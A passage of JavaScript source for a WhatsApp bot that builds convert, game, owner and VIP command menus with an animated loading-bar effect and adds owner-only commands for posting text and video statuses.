͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ Convert Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}wadl
┃𒆜│${prefix}vodl
┃𒆜│${prefix}toqr 
┃𒆜│${prefix}tinyurl
┃𒆜│${prefix}topdf
┃𒆜│${prefix}pictopdf 
┃𒆜│${prefix}tovn 
┃𒆜│${prefix}toaudio 
┃𒆜│${prefix}tomp3 
┃𒆜│${prefix}toimg
┃𒆜│${prefix}sticker 
┃𒆜│${prefix}ebinary 
┃𒆜│${prefix}dbinary
┃𒆜│${prefix}ping
┃𒆜│${prefix}translate
┃𒆜│${prefix}runtime
┃𒆜│${prefix}swm
┃𒆜│${prefix}sc
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break

case 'gamemenu': {
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *Game Menu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕ VIP :* ${aActiveEm}
╰══════════════
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ Game Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}buycoin
┃𒆜│${prefix}spin1
┃𒆜│${prefix}checkme
┃𒆜│${prefix}spin
┃𒆜│${prefix}transfer
┃𒆜│${prefix}daily
┃𒆜│${prefix}gamble
┃𒆜│${prefix}withdraw
┃𒆜│${prefix}deposite
┃𒆜│${prefix}magicpick
┃𒆜│${prefix}truth
┃𒆜│${prefix}dare
┃𒆜│${prefix}checkme
┃𒆜│${prefix}check
┃𒆜│${prefix}colour
┃𒆜│${prefix}guess
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break

case 'ownermenu': {
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *Owner Menu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕ VIP :* ${aActiveEm}
╰══════════════
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ Owner Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}addprem
┃𒆜│${prefix}delprem
┃𒆜│${prefix}listprem 
┃𒆜│${prefix}setdpbot
┃𒆜│${prefix}setdpbot2
┃𒆜│${prefix}addvn
┃𒆜│${prefix}changelang
┃𒆜│${prefix}junkclean
┃𒆜│${prefix}changethumb
┃𒆜│${prefix}statusaudio
┃𒆜│${prefix}statusvideo
┃𒆜│${prefix}statusimage
┃𒆜│${prefix}statustext
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break

case 'vipmenu': {
 
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *VIP Menu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕ VIP :* ${aActiveEm}
╰══════════════
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ Vip Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}alto
┃𒆜│${prefix}chipmunk
┃𒆜│${prefix}claim
┃𒆜│${prefix}dramatic
┃𒆜│${prefix}dvideo
┃𒆜│${prefix}dvid
┃𒆜│${prefix}emojimix
┃𒆜│${prefix}fbvid
┃𒆜│${prefix}fbvid2
┃𒆜│${prefix}fbvid3
┃𒆜│${prefix}gdrive
┃𒆜│${prefix}glorious
┃𒆜│${prefix}hd
┃𒆜│${prefix}igstalk
┃𒆜│${prefix}itgoesup
┃𒆜│${prefix}limit
┃𒆜│${prefix}mediafire
┃𒆜│${prefix}ptvid
┃𒆜│${prefix}qc
┃𒆜│${prefix}removebg
┃𒆜│${prefix}remini
┃𒆜│${prefix}remini2
┃𒆜│${prefix}self
┃𒆜│${prefix}setdpbot2
┃𒆜│${prefix}shazam2
┃𒆜│${prefix}shazam3
┃𒆜│${prefix}sunshine
┃𒆜│${prefix}swm
┃𒆜│${prefix}tenor
┃𒆜│${prefix}text
┃𒆜│${prefix}tinyurl
┃𒆜│${prefix}tobebot
┃𒆜│${prefix}toanime
┃𒆜│${prefix}tocartoon
┃𒆜│${prefix}tozombie
┃𒆜│${prefix}trvid
┃𒆜│${prefix}ttvid
┃𒆜│${prefix}ttvid2
┃𒆜│${prefix}ttvid3
┃𒆜│${prefix}twvid
┃𒆜│${prefix}warmy
┃𒆜│${prefix}ytmp4
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break

case 'statustext': 
case 'upswtext': {

if (!HerbertTheCreator) return dodoi(mess.owner)
if (!q) return dodoi('Words rawn dah tel tawh')
await HBWABotMz.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#000000', font: 3, statusJidList: Object.keys(global.db.users) })
dodoi(`A in upload zo a✓... i check thei ang`)
}
break
case 'statusvideo':
case 'upswvideo': {

if (!HerbertTheCreator) return dodoi(mess.owner)
if (/video/.test(mime)) {
var StatusVid = await HBWABotMz.downloadAndSaveMediaMessage(quoted)
await HBWABotMz.sendMessage('status@broadcast', {
   video: {
url: StatusVid
   },
   caption: q ? q : ''
}, { statusJidList: Object.keys(global.db.users) })
